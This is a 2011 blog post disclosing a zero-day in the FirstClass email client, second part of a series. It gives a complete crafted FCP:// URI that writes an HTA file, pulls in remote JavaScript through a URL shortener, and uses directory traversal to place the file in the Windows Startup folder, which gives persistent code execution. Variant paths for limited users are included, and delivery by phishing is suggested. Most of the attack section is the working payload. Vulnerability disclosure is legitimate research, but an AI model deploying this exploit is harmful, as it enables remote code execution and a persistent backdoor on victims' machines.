---
layout: post
title:  "FirstClass 0day Release (Part 2)"
date:   2011-04-06
excerpt: "...and then an arbitrary file overwrite turned into code execution and persistent backdoor."
tag:
- firstclass
- opentext
- fcp
- email
- URI handlers
- logic
comments: true
---

# Setbacks and bypasses
Upon installing the brand new version of FirstClass (v 10.009), I found that they fixed the path length issue, and I could no longer change the extension of the filename by making a very long filename.  Boo!  I didn’t give up, however, because most times if something seems impossible, you just need to give it more time. I had to make this work.  I played around with `FCP://` links, and found that you can make these links point to directories inside of the FirstClass server.  For instance: `FCP://user:password@fc.server.tld/Mailbox;settings.fc`.

This would open the mailbox of the logged-in user, and create the settings file called `settings.fc`.  As I messed around with launching directories within the server, I decided to try changing the `settings.fc` at the end of the URI to `settings.bat` once again, just for the hell of it.

![A BAT file appears even with the "fix"!](/assets/img/blog1_fcfile.jpg)

What’s that?  It worked?  I didn’t even have to do the long path trick with this new version, as long as I included some random FC directory name to open at the end of the server part of the URI, I would have control of the extension once again. Now I just needed to craft an exploit out of this.

Since the settings file has a bunch of bad characters like nulls at the beginning of it that don't seem to be allowed by the URI parser, I knew I had to find some very loosely typed language which executes on Windows by default with its registered file extension.  That’s when I remembered `HTA`.  `HTA` stands for `HTML Application`, and it uses `HTML` tags, but can also run `Javascript/VBScript` code without popping up so much as a single `Are you sure?` confirmation dialog for the user to agree to, as long as it was created and launched locally.  PERFECT!

With this knowledge, I knew I had to craft the URI perfectly to arrange the scripting information in order to get proper code execution.  Keep in mind that there are junk characters between the parts of plain-text settings,  there are lots of unusable characters in URIs, and as I would soon find out, there are length limits to the `username` and `servername` in the URI. If I failed to get around any of these restrictions, the entire exploit would fail, so it was going to take a lot of careful tweaking.

# Shellcoding tricks in the scripting world
After finding and removing the badchars from my crafted URL, and finding that space was very limited, I decided to use some tricks similar to those I learned while making shellcode for previous exploits on binaries written in memory unmanaged languages.  First I will show the completed URI, then I will explain the steps that were used to accomplish the code execution.

```html
fcp://<hta><script src=‘is.gd/9JR6g0’ id=“s”></script>@<body onload=(s.src=“http”%2bString.fromCharCode(58)%2bString.fromCharCode(47)
%2BString.fromCharCode(47)%2Bs.src)>/j;%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cAll%20Users\Start Menu%5cPrograms%5cStartup%5ca%2ehta
```

The first part,
```html
fcp://<hta><script src=‘is.gd/9JR6g0’ id=“s”></script>
```
This pulls a JavaScript file from a server and includes it in the produced file. Since I had very limited space, I couldn’t fit the entire JavaScript source into the `username` field, and instead I used the url shortening service with the fewest characters as I could find to redirect to the JavaScript file. Also, you’ll notice that there is no `http://` at the beginning of the address. This is because the characters `:` and `/` are some of the badchars that would be transformed since they were in the `username` field. However, in order to include a script from an external site, I needed to specify the protocol.

In order to do this, I gave the script tag an `id` of `s` and later on, I reference it.

```html
<body onload=(s.src=”http”%2bString.fromCharCode(58)%2b
String.fromCharCode(47)%2BString.fromCharCode(47)%2Bs.src)>
```

 This part is where I thought of previous techniques used in shellcoding, in particular *egghunting*. This usually means searching for a *signature* (egg), a pre-established sequence of bytes, through tons of junk assembly code and data and executing the shellcode next to it once we find it. Since JavaScript is an interpreted, object oriented language it’s as simple as giving that `<script>` tag an `id` of `s` and referencing it later in the `server-name` part of the URI and add the `http://` part to the url to make it a valid `src` attribute.

 It took a lot of trial and error to find all the character/length limitations and get everything working. Remember also that to allow us to arbitrarily name the settings file, we have to include a FirstClass server path, so I used `/j` in this example to keep it short.  The character used makes no difference.

 The final trick while figuring out where to put the settings file is to answer the question, “How do we get this `HTA` file to execute without the user being aware?”  I mean, sure we can drop this file somewhere, but the user isn’t (usually) going to click some strange file they’ve never heard of.  However there are some folders as you may know which will automatically launch whatever files are put into them, as soon as the computer boots up.  Knowing the default location that FirstClass saves settings files to is `My Documents\FirstClass\Settings\`, I used *directory traversal* to put our `HTA` file into the startup folder (`C:\Documents and Settings\All Users\Start Menu\Programs\Startup\`) so that it will start up as soon as ANYONE logs into the computer.
```
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cAll%20Users%5cStart Menu%5cPrograms%5cStartup%5ca%2ehta
=
..\..\..\..\All Users\Start Menu\Programs\Startup\a.hta
```
 This assumes that the user is a computer administrator.  If you suspect that your target is computer savvy and has created his or her account as a limited user, you can just as easily drop the file in the `%userprofile%\Start Menu\Programs\Startup` by specifying a settings path of:
```
%2e%2e%5C%2e%2e%5C%2e%2e%5CStart%20Menu%5CPrograms%5CStartup%5ca%2ehta
=
..\..\..\Start Menu\Programs\Startup\a.hta
```
 and it will only start up when the exploited user logs in.

 Deploying this would be a matter of phishing to get the user to click the link. Newer versions of FirstClass have HTML parsers which will actually execute JavaScript (believe it or not) so you could perhaps have the "clicking" be done without the user's interaction, but I'll leave that vector as a fun exercise for my dear reader.

 Thanks for reading!
